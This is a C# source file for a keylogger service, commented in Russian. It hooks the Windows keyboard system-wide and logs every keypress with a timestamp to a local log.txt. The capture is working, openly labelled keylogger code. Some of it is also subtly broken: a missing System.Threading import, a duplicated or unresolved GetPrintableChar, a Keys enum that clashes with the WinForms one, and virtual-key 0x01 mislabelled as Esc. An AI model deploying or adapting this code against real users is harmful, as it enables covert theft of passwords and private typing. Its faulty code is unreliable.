using KeyLogger.Interfaces;
using KeyLogger.Utils;

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger.Services
{
    public class KeyboardHookService: IKeyboardHookService, IDisposable
    {
        #region WinAPI

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        #endregion

        private readonly LowLevelKeyboardProc _proc;
        private IntPtr _hookId = IntPtr.Zero;

        private StreamWriter _logStream;
        private readonly string _logPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "log.txt");

        public KeyboardHookService()
        {
            _proc = HookCallback;
        }

        /// <summary>
        /// Запускает хук и открывает лог
        /// </summary>
        public void Start()
        {
            if(_hookId != IntPtr.Zero)
                return; // уже запущен

            _logStream = new StreamWriter(_logPath, true, Encoding.UTF8)
            {
                AutoFlush = true
            };

            using(var curProcess = System.Diagnostics.Process.GetCurrentProcess())
            {
                var moduleHandle = GetModuleHandle(curProcess.MainModule.ModuleName);
                _hookId = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, moduleHandle, 0);
                if(_hookId == IntPtr.Zero)
                    throw new Exception("Не удалось установить хук клавиатуры");
            }
        }

        /// <summary>
        /// Останавливает хук и закрывает лог
        /// </summary>
        public void Stop()
        {
            if(_hookId != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookId);
                _hookId = IntPtr.Zero;
            }

            _logStream?.Dispose();
            _logStream = null;
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if(nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vk = Marshal.ReadInt32(lParam);
                string printable = KeyboardConverter.GetPrintableChar(vk);

                // Если символ получен – пишем его
                if(!string.IsNullOrEmpty(printable))
                    _logStream?.WriteLine($"{DateTime.Now:yyyy-MM-dd HH:mm:ss.fff} - {printable}");
                else
                {
                    // fallback – человекочитаемое название клавиши (см. предыдущий ответ)
                    string keyName = GetKeyName(vk);
                    _logStream?.WriteLine($"{DateTime.Now:yyyy-MM-dd HH:mm:ss.fff} - {keyName}");
                }
            }

            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        public void Dispose()
        {
            Stop();
        }

        private static string GetKeyName(int vkCode)
        {
            // Если получаем печатный символ – используем его
            var printable = GetPrintableChar(vkCode);
            if(!string.IsNullOrEmpty(printable))
                return printable;

            // Иначе возвращаем более понятное название клавиши
            switch(vkCode)
            {
                case 0x01:
                return "Esc";
                case 0x09:
                return "Tab";
                case 0x0D:
                return "Enter";
                case 0x10:
                return "Shift";
                case 0x11:
                return "Ctrl";
                case 0x12:
                return "Alt";
                case 0x14:
                return "CapsLock";
                case 0x1B:
                return "Esc";
                // ... добавьте остальные VK_* по необходимости
                default:
                // Попытка получить имя из WinForms Keys
                if(Enum.IsDefined(typeof(Keys), vkCode))
                    return ((Keys)vkCode).ToString();
                else
                    return $"VK_{vkCode:X2}";
            }
        }

        private static string GetPrintableChar(int vkCode)
        {
            // 1. Состояние клавиш (Shift/CapsLock/NumLock и т.д.)
            byte[] keyState = new byte[256];
            bool stateOk = WinApi.GetKeyboardState(keyState);
            if(!stateOk)
                return string.Empty;   // можно добавить логирование ошибки

            // 2. Перевод виртуального кода в scancode
            uint scanCode = WinApi.MapVirtualKey((uint)vkCode, WinApi.MAPVK_VK_TO_VSC);

            // 3. Получаем дескриптор раскладки для текущего потока
            IntPtr hkl = WinApi.GetKeyboardLayout((uint)Thread.CurrentThread.ManagedThreadId);

            // 4. Переводим в Unicode‑символ(ы)
            StringBuilder sb = new StringBuilder(10);
            int result = WinApi.ToUnicodeEx( (uint)vkCode, scanCode, keyState, sb, sb.Capacity, 0, hkl);

            return result > 0 ? sb.ToString() : string.Empty;
        }


        public enum Keys: int
        {
            // Базовые клавиши
            Back = 0x08,
            Tab = 0x09,
            Enter = 0x0D,
            ShiftKey = 0x10,
            ControlKey = 0x11,
            Menu = 0x12,
            Pause = 0x13,
            CapsLock = 0x14,
            Escape = 0x1B,
            Space = 0x20,
            // …
            F1 = 0x70, F2 = 0x71, /* … */ F24 = 0x97,
            // Нумпад
            NumPad0 = 0x60, /* … */ NumPad9 = 0x69,
            // Диапазон букв A–Z (0x41–0x5A)
        }



    }

}
